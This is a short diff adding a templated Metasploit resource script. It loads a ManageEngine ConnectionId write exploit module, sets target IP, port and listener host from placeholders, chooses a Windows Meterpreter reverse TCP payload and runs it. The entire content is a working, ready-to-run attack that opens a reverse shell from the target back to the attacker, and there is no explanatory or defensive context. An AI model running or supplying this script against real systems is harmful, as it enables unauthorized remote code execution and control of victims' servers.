@@ -1,0 +1,6 @@
+use exploit/windows/http/manageengine_connectionid_write
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set LHOST %%LHOST%%
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
